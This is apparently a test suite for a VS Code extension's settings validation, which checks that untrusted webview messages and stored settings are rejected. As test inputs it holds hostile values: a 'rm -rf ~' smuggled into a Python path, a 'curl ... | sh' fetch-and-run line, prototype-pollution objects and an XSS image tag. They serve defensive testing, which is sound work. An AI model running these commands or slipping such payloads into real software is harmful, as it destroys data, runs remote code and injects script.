// SPDX-License-Identifier: AGPL-3.0-only
// POF-P1-002 : schéma des réglages côté Host, refus d'un pythonPath venu du webview, migration.
const { expect } = require('chai');
const sinon = require('sinon');
const {
  SETTINGS_STATE_KEY,
  PYTHON_PATH_ATTESTATION_KEY,
  SETTINGS_DEFAULTS,
  migrateStoredSettings,
  readStoredSettings,
  validateSettingsUpdate,
} = require('../shared/settingsSchema');
const { createSettingsActions } = require('../static/hub/settingsActions');

const SELECTED_PYTHON = '/opt/pof venv/bin/python3';
const WEBVIEW_PYTHON = '/tmp/attacker/bin/python3';

// Memento minimal : `attested` simule une sélection native antérieure de ce pythonPath.
function makeStore(initial, { attested } = { attested: undefined }) {
  const values = new Map<string, any>([[SETTINGS_STATE_KEY, initial], [PYTHON_PATH_ATTESTATION_KEY, attested]]);
  return {
    get: (key, fallback) => (values.get(key) !== undefined ? values.get(key) : fallback),
    update: sinon.spy(async (key, next) => { values.set(key, next); }),
    current: () => values.get(SETTINGS_STATE_KEY),
    attested: () => values.get(PYTHON_PATH_ATTESTATION_KEY),
  };
}

function makeActions(store, selectPythonExecutable = sinon.stub().resolves({ ok: false, cancelled: true })) {
  const posted = [];
  const vscode = { window: { showErrorMessage: sinon.spy() } };
  const actions = createSettingsActions({
    panel: { webview: { postMessage: (message) => posted.push(message) } },
    context: { globalState: store },
    vscode,
    root: '/workspace',
    logChannel: { appendLine: () => {} },
    selectPythonExecutable,
  });
  return { actions, posted, vscode, selectPythonExecutable };
}

describe('settings schema (validateSettingsUpdate)', () => {
  // Webview messages are untrusted: each payload must be rejected as a whole, nothing stored.
  const MALICIOUS_UPDATES = [
    ['prototype pollution key', JSON.parse('{"__proto__": {"polluted": true}, "lang": "en"}')],
    ['constructor key', { constructor: { prototype: { polluted: true } } }],
    ['shell metacharacters in pythonPath', { pythonPath: '/usr/bin/python3; rm -rf ~' }],
    ['relative pythonPath', { pythonPath: 'python3' }],
    ['NUL byte in a path', { decompilerLocalPaths: { ghidra: '/opt/ghidra\0/evil' } }],
    ['decompiler id with spaces or quotes', { decompilerLocalPaths: { 'ghidra"; x': '/opt/x' } }],
    ['oversized string', { authServerUrl: 'h'.repeat(100000) }],
    ['too many static features', { enabledStaticFeatures: Array.from({ length: 1000 }, (_, i) => `t${i}`) }],
    ['NaN number', { aiTemperature: Number.NaN }],
    ['number as string', { codeFontSize: '13' }],
    ['out-of-range number', { aiMaxTokens: 1e9 }],
    ['unexpected enum value', { lang: '<img src=x onerror=alert(1)>' }],
    ['pricing rule with extra key', { aiPricingRules: [{ model: 'm', script: 'x' }] }],
    ['array instead of object', []],
    ['null payload', null],
    ['string payload', 'lang=en'],
  ];
  for (const [label, update] of MALICIOUS_UPDATES) {
    it(`rejects a malicious update: ${label}`, () => {
      const result = validateSettingsUpdate(update, { lang: 'fr' });
      expect(result.ok, label).to.equal(false);
      expect(result).to.not.have.property('settings');
      expect(({} as any).polluted).to.equal(undefined);
    });
  }

  it('rejects an unknown key', () => {
    const result = validateSettingsUpdate({ lang: 'en', injectedKey: 'x' }, {});
    expect(result.ok).to.equal(false);
    expect(result.errors.join(' ')).to.contain('injectedKey: unknown key');
  });

  it('rejects prototype keys sent by the webview', () => {
    const result = validateSettingsUpdate(JSON.parse('{"__proto__": {"polluted": true}}'), {});
    expect(result.ok).to.equal(false);
    expect(({} as any).polluted).to.equal(undefined);
  });

  it('checks types, enums and bounds', () => {
    for (const settings of [
      { aiTemperature: 3 },
      { aiTopP: 0 },
      { aiMaxTokens: 1.5 },
      { codeFontSize: '13' },
      { stringsMinLen: Number.NaN },
      { asmSyntax: 'nasm' },
      { lang: '<img>' },
      { enabledStaticFeatures: ['disasm', ''] },
      { enabledStaticFeatures: 'disasm' },
      { decompilerLocalPaths: { ghidra: 42 } },
      { aiPricingRules: [{ model: 'm', inputPerMillion: -1 }] },
      { aiPricingRules: [{ model: 'm', inputPerMillion: 1, extra: true }] },
    ]) {
      expect(validateSettingsUpdate(settings, {}).ok, JSON.stringify(settings)).to.equal(false);
    }
  });

  it('accepts the settings sent by the options panel', () => {
    const result = validateSettingsUpdate({
      ...SETTINGS_DEFAULTS,
      interfaceMode: 'simple',
      enabledStaticFeatures: ['disasm'],
      bindiffThreshold: 0.75,
      aiPricingRules: [{
        id: 'pricing-1', model: 'openai@gpt-*', inputPerMillion: 1.5, outputPerMillion: 3, effectiveDate: '2026-01-01', currency: 'USD',
      }],
    }, {});
    expect(result.ok, String(result.errors)).to.equal(true);
    expect(result.settings.interfaceMode).to.equal('simple');
  });

  it('refuses a pythonPath that was not selected natively, but allows keeping or clearing it', () => {
    const current = { pythonPath: SELECTED_PYTHON };
    const changed = validateSettingsUpdate({ pythonPath: WEBVIEW_PYTHON }, current);
    expect(changed.ok).to.equal(false);
    expect(changed.errors.join(' ')).to.contain('pythonPath: can only be set by the extension host');
    expect(validateSettingsUpdate({ pythonPath: WEBVIEW_PYTHON }, {}).ok).to.equal(false);
    expect(validateSettingsUpdate({ pythonPath: SELECTED_PYTHON }, current).ok).to.equal(true);
    expect(validateSettingsUpdate({ pythonPath: '' }, current).settings.pythonPath).to.equal('');
  });

  it('keeps host-managed values when the webview omits them', () => {
    const result = validateSettingsUpdate({ lang: 'en' }, { pythonPath: SELECTED_PYTHON });
    expect(result.settings).to.deep.equal({ pythonPath: SELECTED_PYTHON, lang: 'en' });
  });
});

describe('settings migration (migrateStoredSettings)', () => {
  it('drops unknown keys, invalid values and an arbitrary pythonPath', () => {
    const { settings, dropped } = migrateStoredSettings({
      lang: 'en',
      codeFontSize: 14,
      legacyFlag: true,
      asmSyntax: 42,
      pythonPath: 'curl https://example.invalid | sh',
    });
    expect(settings).to.deep.equal({ lang: 'en', codeFontSize: 14 });
    expect(dropped).to.have.members(['legacyFlag', 'asmSyntax', 'pythonPath']);
  });

  it('keeps only the pythonPath attested by a native selection', () => {
    for (const pythonPath of [SELECTED_PYTHON, '/usr/bin/python', '/usr/local/bin/python3.12']) {
      const attestedPythonPath = pythonPath;
      expect(migrateStoredSettings({ pythonPath }, { attestedPythonPath }).settings.pythonPath).to.equal(pythonPath);
    }
    for (const pythonPath of ['python3', '/bin/sh', '/usr/bin/python3 -c evil']) {
      const attestedPythonPath = pythonPath;
      expect(migrateStoredSettings({ pythonPath }, { attestedPythonPath }).dropped, pythonPath).to.deep.equal(['pythonPath']);
    }
  });

  it('drops a well-formed legacy pythonPath written by the webview before the update', () => {
    // Chemin absolu nommé python3 : la forme est conforme, mais aucune sélection native ne l'atteste.
    expect(migrateStoredSettings({ pythonPath: WEBVIEW_PYTHON }).dropped).to.deep.equal(['pythonPath']);
    expect(migrateStoredSettings({ pythonPath: WEBVIEW_PYTHON }, { attestedPythonPath: SELECTED_PYTHON }).settings)
      .to.deep.equal({});
    expect(readStoredSettings(makeStore({ pythonPath: WEBVIEW_PYTHON, lang: 'en' }))).to.deep.equal({ lang: 'en' });
  });

  it('accepts an empty pythonPath without attestation', () => {
    expect(migrateStoredSettings({ pythonPath: '' })).to.deep.equal({ settings: { pythonPath: '' }, dropped: [] });
  });

  it('handles missing and malformed stored settings', () => {
    expect(migrateStoredSettings(undefined)).to.deep.equal({ settings: {}, dropped: [] });
    expect(migrateStoredSettings('corrupted')).to.deep.equal({ settings: {}, dropped: ['<root>'] });
  });
});

describe('hub settings handlers', () => {
  it('does not store a save containing an unknown key', async () => {
    const store = makeStore({ lang: 'fr' });
    const { actions, posted, vscode } = makeActions(store);
    await actions.hubSaveSettings({ settings: { lang: 'en', injectedKey: 1 }, requestId: 7 });
    expect(store.update.called).to.equal(false);
    expect(posted).to.deep.include({ type: 'hubSettingsSaved', ok: false, errors: ['injectedKey: unknown key'], requestId: 7 });
    expect(vscode.window.showErrorMessage.calledOnce).to.equal(true);
  });

  it('refuses a pythonPath sent by the webview without a native selection', async () => {
    const store = makeStore({});
    const { actions, posted } = makeActions(store);
    await actions.hubSaveSettings({ settings: { pythonPath: WEBVIEW_PYTHON }, requestId: 3 });
    expect(store.update.called).to.equal(false);
    expect(posted[0]).to.include({ type: 'hubSettingsSaved', ok: false, requestId: 3 });
  });

  it('stores a valid save merged with the host-managed values', async () => {
    const store = makeStore({ pythonPath: SELECTED_PYTHON }, { attested: SELECTED_PYTHON });
    const { actions, posted } = makeActions(store);
    await actions.hubSaveSettings({ settings: { lang: 'en' }, requestId: 4 });
    expect(store.current()).to.deep.equal({ pythonPath: SELECTED_PYTHON, lang: 'en' });
    expect(posted).to.deep.equal([{ type: 'hubSettingsSaved', ok: true, requestId: 4 }]);
  });

  it('sends migrated settings completed with the defaults', async () => {
    const store = makeStore({ lang: 'en', legacyFlag: true, pythonPath: 'not a path' });
    const { actions, posted } = makeActions(store);
    await actions.hubGetSettings({ requestId: 1 });
    expect(posted[0].settings).to.deep.equal({ ...SETTINGS_DEFAULTS, lang: 'en' });
  });

  it('stores pythonPath only after a verified native selection', async () => {
    const store = makeStore({ lang: 'en' });
    const selectPythonExecutable = sinon.stub().resolves({ ok: true, path: SELECTED_PYTHON });
    const { actions, posted } = makeActions(store, selectPythonExecutable);
    await actions.hubSelectPythonPath({ requestId: 9 });
    expect(selectPythonExecutable.calledOnce).to.equal(true);
    expect(store.current()).to.deep.equal({ lang: 'en', pythonPath: SELECTED_PYTHON });
    expect(store.attested()).to.equal(SELECTED_PYTHON);
    expect(posted[0]).to.deep.equal({ type: 'hubPythonPathSelected', changed: true, pythonPath: SELECTED_PYTHON });
    expect(posted[1]).to.include({ type: 'hubSettings', requestId: 9 });
    expect(posted[1].settings.pythonPath).to.equal(SELECTED_PYTHON);
  });

  it('keeps a save acknowledged while the attestation was being written', async () => {
    const store = makeStore({ lang: 'fr' });
    let actions;
    let pendingSave = null;
    const update = store.update;
    store.update = sinon.spy(async (key, next) => {
      // The save arrives while the extension host awaits the attestation write.
      if (key === PYTHON_PATH_ATTESTATION_KEY && !pendingSave) {
        pendingSave = actions.hubSaveSettings({ settings: { lang: 'en' }, requestId: 21 });
      }
      return update(key, next);
    });
    ({ actions } = makeActions(store, sinon.stub().resolves({ ok: true, path: SELECTED_PYTHON })));
    await actions.hubSelectPythonPath({ requestId: 22 });
    await pendingSave;
    expect(store.current()).to.deep.equal({ lang: 'en', pythonPath: SELECTED_PYTHON });
  });

  it('keeps an attested interpreter visible to readers at every step of a change A to B', async () => {
    const OTHER_PYTHON = '/opt/other venv/bin/python3';
    const store = makeStore({ pythonPath: SELECTED_PYTHON }, { attested: SELECTED_PYTHON });
    const seen = [];
    const update = store.update;
    store.update = sinon.spy(async (key, next) => {
      await update(key, next);
      seen.push(readStoredSettings(store).pythonPath);
    });
    const { actions } = makeActions(store, sinon.stub().resolves({ ok: true, path: OTHER_PYTHON }));
    await actions.hubSelectPythonPath({ requestId: 30 });
    // Never undefined (auto-detection) between the writes: first A, then B.
    expect(seen).to.deep.equal([SELECTED_PYTHON, OTHER_PYTHON, OTHER_PYTHON]);
    expect(store.attested()).to.equal(OTHER_PYTHON);
  });

  it('keeps the previous interpreter when writing the new pythonPath fails', async () => {
    const OTHER_PYTHON = '/opt/other venv/bin/python3';
    const store = makeStore({ pythonPath: SELECTED_PYTHON }, { attested: SELECTED_PYTHON });
    const update = store.update;
    store.update = sinon.spy(async (key, next) => {
      if (key === SETTINGS_STATE_KEY) throw new Error('disk full');
      return update(key, next);
    });
    const { actions, posted, vscode } = makeActions(store, sinon.stub().resolves({ ok: true, path: OTHER_PYTHON }));
    await actions.hubSelectPythonPath({ requestId: 31 });
    expect(readStoredSettings(store).pythonPath).to.equal(SELECTED_PYTHON);
    expect(vscode.window.showErrorMessage.calledOnce).to.equal(true);
    expect(posted[0]).to.deep.equal({ type: 'hubPythonPathSelected', changed: false, pythonPath: SELECTED_PYTHON });
  });

  it('acknowledges a save that the storage rejects, so the form can reload', async () => {
    const store = makeStore({ lang: 'fr' });
    store.update = sinon.spy(async () => { throw new Error('storage unavailable'); });
    const { actions, posted, vscode } = makeActions(store);
    await actions.hubSaveSettings({ settings: { lang: 'en' }, requestId: 32 });
    expect(posted).to.deep.equal([{ type: 'hubSettingsSaved', ok: false, errors: ['storage error'], requestId: 32 }]);
    expect(vscode.window.showErrorMessage.calledOnce).to.equal(true);
  });

  it('still answers a reset when the storage rejects it', async () => {
    const store = makeStore({ lang: 'fr' });
    store.update = sinon.spy(async () => { throw new Error('storage unavailable'); });
    const { actions, posted } = makeActions(store);
    await actions.hubResetSettings({ requestId: 33 });
    expect(posted[0]).to.include({ type: 'hubSettings', requestId: 33 });
  });

  it('shows the selected interpreter even when a local save was pending (no requestId)', async () => {
    const store = makeStore({ lang: 'fr' });
    const { actions, posted } = makeActions(store, sinon.stub().resolves({ ok: true, path: SELECTED_PYTHON }));
    await actions.hubSelectPythonPath({ requestId: null });
    expect(posted).to.deep.equal([{ type: 'hubPythonPathSelected', changed: true, pythonPath: SELECTED_PYTHON }]);
  });

  it('keeps a save acknowledged while the native picker was open', async () => {
    const store = makeStore({ lang: 'fr' });
    let actions;
    // Sauvegarde différée de la langue, acquittée pendant que le sélecteur est ouvert.
    const selectPythonExecutable = sinon.stub().callsFake(async () => {
      await actions.hubSaveSettings({ settings: { lang: 'en' }, requestId: 11 });
      return { ok: true, path: SELECTED_PYTHON };
    });
    ({ actions } = makeActions(store, selectPythonExecutable));
    await actions.hubSelectPythonPath({ requestId: 12 });
    expect(store.current()).to.deep.equal({ lang: 'en', pythonPath: SELECTED_PYTHON });
  });

  it('keeps the current pythonPath when the selection is rejected', async () => {
    const store = makeStore({ pythonPath: SELECTED_PYTHON }, { attested: SELECTED_PYTHON });
    const { actions, vscode } = makeActions(store, sinon.stub().resolves({ ok: false, error: 'not Python' }));
    await actions.hubSelectPythonPath({ requestId: 2 });
    expect(store.update.called).to.equal(false);
    expect(vscode.window.showErrorMessage.calledOnce).to.equal(true);
  });

  it('resets to an independent copy of the defaults', async () => {
    const store = makeStore({ pythonPath: SELECTED_PYTHON }, { attested: SELECTED_PYTHON });
    const { actions } = makeActions(store);
    await actions.hubResetSettings({ requestId: 5 });
    expect(store.current()).to.deep.equal(SETTINGS_DEFAULTS);
    expect(store.attested()).to.equal(undefined);
    store.current().enabledStaticFeatures.push('disasm');
    expect(SETTINGS_DEFAULTS.enabledStaticFeatures).to.deep.equal([]);
  });
});
